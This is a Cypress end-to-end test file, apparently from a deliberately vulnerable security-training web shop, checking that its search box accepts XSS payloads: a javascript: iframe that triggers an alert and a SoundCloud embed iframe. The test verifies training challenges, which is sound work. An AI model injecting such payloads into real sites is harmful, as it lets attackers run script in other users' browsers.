describe('/#/search', () => {
  beforeEach(() => {
    cy.visit('/#/search')
  })
  describe('challenge "localXss"', () => {
    // Cypress alert bug
    xit('search query should be susceptible to reflected XSS attacks', () => {
      cy.get('#searchQuery').click()
      cy.get('app-mat-search-bar input')
        .type('<iframe src="javascript:alert(`xss`)">')
        .type('{enter}')
      cy.on('window:alert', (t) => {
        expect(t).to.equal('xss')
      })
      cy.expectChallengeSolved({ challenge: 'DOM XSS' })
    })
  })
  describe('challenge "xssBonusPayload"', () => {
    it('search query should be susceptible to reflected XSS attacks', () => {
      cy.get('#searchQuery').click()
      cy.get('app-mat-search-bar input')
        .type(
          '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'
        )
        .type('{enter}')
      cy.expectChallengeSolved({ challenge: 'Bonus Payload' })
    })
  })
})
